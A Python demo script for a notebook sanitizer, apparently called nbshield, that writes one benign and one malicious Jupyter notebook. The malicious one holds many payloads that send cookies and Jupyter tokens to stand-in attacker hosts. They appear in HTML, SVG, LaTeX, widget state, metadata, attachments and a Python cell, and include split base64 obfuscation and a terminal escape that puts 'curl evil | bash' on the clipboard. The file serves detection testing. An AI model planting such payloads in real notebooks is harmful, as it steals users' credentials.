#!/usr/bin/env python3
"""生成演示笔记本:一份"正常"的,一份植入了多层恶意载荷的。

用法::

    python3 examples/make_demo.py
    nbshield check examples/demo_malicious.ipynb
    nbshield sanitize examples/demo_malicious.ipynb -o /tmp/clean.ipynb

恶意样本覆盖真实攻击手法:输出单元格里的凭证外传、元数据里的配置、
widget 状态里的 HTML 注入、编码混淆的分段载荷、终端转义、Markdown 内嵌 HTML。
"""

from __future__ import annotations

import base64
import json
import os

HERE = os.path.dirname(os.path.abspath(__file__))

PLOTLY = """<div>                        <div id="e7c1" class="plotly-graph-div" style="height:420px;width:100%;"></div>
<script type="text/javascript">
    window.PLOTLYENV=window.PLOTLYENV || {};
    if (document.getElementById("e7c1")) {
        Plotly.newPlot("e7c1",
            [{"x":["Jan","Feb","Mar"],"y":[120,190,160],"type":"bar","name":"Revenue"}],
            {"title":{"text":"Quarterly Revenue"},"template":{"data":{"bar":[{"marker":{"color":"#2a9d8f"}}]}}},
            {"responsive": true});
    }
</script></div>"""

MATPLOTLIB_SVG = """<svg xmlns="http://www.w3.org/2000/svg" width="320" height="180" viewBox="0 0 320 180">
<style>text{font-family:sans-serif;font-size:11px}</style>
<rect x="0" y="0" width="320" height="180" fill="#ffffff"/>
<rect x="40" y="30" width="30" height="110" fill="#1f77b4"/>
<rect x="80" y="60" width="30" height="80" fill="#1f77b4"/>
<text x="45" y="160">Jan</text><text x="85" y="160">Feb</text>
</svg>"""

STYLED_TABLE = """<style type="text/css">
  .dataframe tbody tr th { vertical-align: top; }
  .dataframe thead th { text-align: right; }
  .dataframe { border-collapse: collapse; }
  .dataframe td, .dataframe th { padding: 4px 8px; border: 1px solid #ddd; }
</style>
<table class="dataframe">
  <thead><tr><th>region</th><th>q1</th><th>q2</th></tr></thead>
  <tbody><tr><td>APAC</td><td>120</td><td>190</td></tr>
          <tr><td>EMEA</td><td>88</td><td>101</td></tr></tbody>
</table>"""

BOKEH = """<div id="bk1"></div>
<script src="https://cdn.bokeh.org/bokeh/release/bokeh-3.3.0.min.js"></script>
<script>Bokeh.embed.embed_item({"docid":"d1","root_id":"r1"});</script>"""


def code_cell(cid, src, outputs):
    return {
        "cell_type": "code",
        "id": cid,
        "metadata": {},
        "source": src,
        "execution_count": 1,
        "outputs": outputs,
    }


def md_cell(cid, src, metadata=None, attachments=None):
    c = {"cell_type": "markdown", "id": cid, "metadata": metadata or {}, "source": src}
    if attachments:
        c["attachments"] = attachments
    return c


def display(mime, value):
    return {"output_type": "display_data", "metadata": {}, "data": {mime: value}}


# --- 良性笔记本 ----------------------------------------------------------

def benign_notebook():
    return {
        "nbformat": 4,
        "nbformat_minor": 5,
        "metadata": {
            "kernelspec": {"name": "python3", "display_name": "Python 3", "language": "python"},
            "language_info": {"name": "python", "version": "3.11.4"},
        },
        "cells": [
            md_cell("m1", "# Q3 销售分析\n\n本笔记本汇总各区域季度销售,并绘制图表。"),
            code_cell("c1", "import pandas as pd\nimport plotly.express as px",
                      [display("text/plain", "<module 'pandas'>")]),
            code_cell("c2", "px.bar(df, x='month', y='revenue', title='Quarterly Revenue')",
                      [display("text/html", PLOTLY), display("text/plain", "Figure(...)")]),
            code_cell("c3", "fig, ax = plt.subplots()\nax.bar(...)",
                      [display("image/svg+xml", MATPLOTLIB_SVG),
                       display("text/plain", "<Figure size 320x180>")]),
            code_cell("c4", "df.style.format('{:.0f}')",
                      [display("text/html", STYLED_TABLE), display("text/plain", "<pandas Styler>")]),
            code_cell("c5", "from bokeh.plotting import show\nshow(p)",
                      [display("text/html", BOKEH)]),
            code_cell("c6", "print('done')",
                      [{"output_type": "stream", "name": "stdout", "text": "done\n"}]),
        ],
    }


# --- 恶意笔记本 ----------------------------------------------------------

def malicious_notebook():
    payload_b64 = base64.b64encode(
        b"fetch('https://collector.attacker.test/ingest?d='+"
        b"encodeURIComponent(document.cookie+'|'+localStorage.getItem('jupyter-token')))"
    ).decode()
    # 分段拼接:前后两半分开写
    half = len(payload_b64) // 2
    split_a, split_b = payload_b64[:half], payload_b64[half:]

    concat_b64 = base64.b64encode(
        b"fetch('https://hook.attacker.test/'+document.cookie)"
    ).decode()

    evil_html = f"""<div>Rendering report…</div>
<script>
  // 输出单元格里的凭证外传:读取 Cookie 与 localStorage,POST 到攻击者
  var _c = document.cookie + '|' + (localStorage.getItem('jupyter-token') || '');
  fetch('https://collector.attacker.test/ingest', {{method:'POST', body:_c, mode:'no-cors'}});
</script>
<img src="data:image/gif;base64,R0lGODlhAQABAAAAACw=" onerror="new Image().src='https://px.attacker.test/?c='+document.cookie">"""

    encoded_html = f"""<div id="chart"></div>
<script>
  // 编码 + 分段拼接,规避关键词匹配
  var p = atob('{split_a}' + '{split_b}');
  (new Function(p))();
</script>"""

    evil_svg = """<svg xmlns="http://www.w3.org/2000/svg" width="200" height="60">
  <a href="javascript:void(0)">
    <animate attributeName="href" values="javascript:fetch('https://evil.test/x?c='+document.cookie)"/>
    <text x="10" y="30">Open dashboard</text>
  </a>
</svg>"""

    evil_md = """# 项目报告

正常正文与 **粗体**。

<img src=x onerror="fetch('https://attacker.test/md?c='+document.cookie)">
<a href="javascript:alert(document.cookie)">点此查看</a>

正常结尾的表格:

| region | q1 |
|--------|----|
| APAC   | 120 |

<iframe src="https://attacker.test/phish"></iframe>
"""

    evil_js_output = (
        "fetch('https://attacker.test/js-output',{method:'POST',"
        "body:document.cookie});"
    )

    evil_latex = r"$\href{javascript:fetch('https://attacker.test/t?c='+document.cookie)}{Click}$"

    nb = {
        "nbformat": 4,
        "nbformat_minor": 5,
        "metadata": {
            "kernelspec": {"name": "python3", "display_name": "Python 3", "language": "python"},
            "language_info": {"name": "python", "version": "3.11.4"},
            # 元数据里的活动内容
            "html_annotations": "<script>fetch('https://attacker.test/meta',{body:document.cookie})</script>",
            "custom_url": "javascript:alert(document.cookie)",
            "widgets": {
                "application/vnd.jupyter.widget-view+json": {
                    "model_id": "w1", "version_major": 2, "version_minor": 0
                },
                "state": {
                    "w1": {
                        "model_name": "HTMLModel",
                        "model_module": "@jupyter-widgets/controls",
                        "model_module_version": "2.0.0",
                        "state": {
                            "value": "<img src=x onerror=\"fetch('https://attacker.test/widget?c='+document.cookie)\">"
                        },
                    }
                },
            },
        },
        "cells": [
            code_cell("evil1", "render_report()",
                      [display("text/html", evil_html),
                       display("text/plain", "Report rendered")]),
            code_cell("evil2", "plot_chart()",
                      [display("text/html", encoded_html)]),
            code_cell("evil3", "draw_svg()",
                      [display("image/svg+xml", evil_svg)]),
            # 保留一份正常图表,证明清洗后仍可显示
            code_cell("c2", "px.bar(df, ...)",
                      [display("text/html", PLOTLY), display("text/plain", "Figure")]),
            md_cell("evil4", evil_md),
            code_cell("evil5", "from IPython.display import Javascript\ndisplay(Javascript(src))",
                      [display("application/javascript", evil_js_output)]),
            code_cell("evil6", "Math(r'\\href{...}{Click}')",
                      [display("text/latex", evil_latex)]),
            # 终端转义:OSC 52 写剪贴板 + 标题篡改
            code_cell("evil7", "print('x')",
                      [{"output_type": "stream", "name": "stdout",
                        "text": "\x1b]52;c;Y3VybCBldmlsIHwgYmFzaA==\x07"
                                "\x1b]0;PWNED\x07正常输出\n"
                                "\x1b[31m红色错误\x1b[0m\n"}]),
            # 附件里藏 HTML
            md_cell("evil8", "见附件",
                    attachments={
                        "p.png": {"text/html": "<script>fetch('https://attacker.test/att',{body:document.cookie})</script>"}
                    }),
            # 代码单元:运行时才执行的模式(只告警)
            code_cell("evil9",
                      "%%javascript\nfetch('https://attacker.test/magic?c='+document.cookie)",
                      []),
            code_cell("evil10",
                      "import os, requests\n"
                      "tok = os.environ['JUPYTER_TOKEN']\n"
                      "requests.post('https://attacker.test/tok', data=tok)\n",
                      []),
        ],
    }
    return nb


def main() -> None:
    for name, nb in (("demo_benign.ipynb", benign_notebook()),
                     ("demo_malicious.ipynb", malicious_notebook())):
        path = os.path.join(HERE, name)
        with open(path, "w", encoding="utf-8") as fh:
            json.dump(nb, fh, ensure_ascii=False, indent=1)
        print("wrote", path)


if __name__ == "__main__":
    main()
